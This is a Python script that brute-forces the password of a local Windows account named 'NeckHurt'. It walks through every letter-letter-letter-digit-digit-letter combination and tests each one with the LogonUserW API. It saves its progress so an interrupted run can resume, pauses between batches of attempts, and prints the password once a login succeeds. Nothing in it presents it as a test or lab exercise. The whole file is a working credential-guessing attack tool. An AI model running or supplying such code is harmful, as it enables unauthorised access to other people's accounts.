import itertools
import ctypes
from ctypes import wintypes
import pickle
import os
import time

# --- CONFIG ---
user = "NeckHurt"
letters = "abcdefghijklmnopqrstuvwxyz"
numbers = "0123456789"
state_file = "sigma_state.pkl"
log_file = "logs/error_log.txt"
save_every = 100      # Save progress every N combos
chunk_size = 50000    # Pause every chunk for stability
manual_start = 0      # Change this to start from a specific combo

# --- SETUP LOGS ---
os.makedirs("logs", exist_ok=True)
if not os.path.exists(log_file):
    with open(log_file, "w") as f:
        f.write(f"SIGMA SESSION START {time.ctime()}\n")

# --- LOAD LAST STATE ---
try:
    with open(state_file, "rb") as f:
        last_index = pickle.load(f)
except:
    last_index = 0

# Use manual start if higher
last_index = max(last_index, manual_start)

count = 0
combo_count = 0

# --- Windows API SETUP ---
advapi32 = ctypes.WinDLL('Advapi32.dll')
LogonUser = advapi32.LogonUserW
LOGON32_LOGON_INTERACTIVE = 2
LOGON32_PROVIDER_DEFAULT = 0

def try_login(username, password):
    token = wintypes.HANDLE()
    success = LogonUser(username, None, password,
                        LOGON32_LOGON_INTERACTIVE,
                        LOGON32_PROVIDER_DEFAULT,
                        ctypes.byref(token))
    if success:
        return True
    return False

# --- COMBO GENERATOR ---
def combo_generator():
    for l1 in letters:
        for l2 in letters:
            for l3 in letters:
                for n1 in numbers:
                    for n2 in numbers:
                        for l4 in letters:
                            yield f"{l1}{l2}{l3}{n1}{n2}{l4}"

# --- MAIN LOOP ---
for combo in combo_generator():
    count += 1
    combo_count += 1
    if count <= last_index:
        continue  # skip already attempted combos

    print(f"[ATTEMPT {count}] {combo}", end="\r")

    try:
        if try_login(user, combo):
            print(f"\n[+] PASSWORD FOUND: {combo}")
            break
    except Exception as e:
        with open(log_file, "a") as f:
            f.write(f"{time.ctime()} EXCEPTION on combo {combo}: {str(e)}\n")

    # --- SAVE PROGRESS ---
    if count % save_every == 0:
        with open(state_file, "wb") as f:
            pickle.dump(count, f)

    # --- CHUNK PAUSE ---
    if combo_count >= chunk_size:
        combo_count = 0
        time.sleep(1)

print("\nSIGMA GRIND COMPLETE, MY TOILET!")
